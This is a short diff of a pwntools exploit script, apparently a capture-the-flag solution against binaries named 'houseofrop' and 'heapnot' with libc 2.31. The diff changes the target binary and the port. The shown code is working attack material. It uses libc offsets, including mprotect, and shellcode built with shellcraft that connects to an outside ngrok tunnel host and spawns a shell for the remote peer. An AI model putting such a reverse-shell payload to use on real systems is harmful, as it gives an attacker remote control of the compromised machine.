@@ -3,7 +3,7 @@ import time
 
 #init
 
-e = ELF('./houseofrop')
+e = ELF('./heapnot')
 libc = ELF('./libc-2.31.so')
 
 context.binary = e
@@ -52,8 +52,8 @@ arena_off = 0x1bebe0
 mprotect_off = libc.sym['mprotect']
 
 shellcode = shellcraft.open('/dev/pts/0')
-shellcode += shellcraft.connect('4.tcp.ngrok.io', 14417)
-shellcode += shellcraft.findpeersh(14417)
+shellcode += shellcraft.connect('4.tcp.ngrok.io', 13964)
+shellcode += shellcraft.findpeersh(13964)
 
 log.info('Csu adr: ' + hex(csu))
 log.info('Dtor adr: ' + hex(dtor))
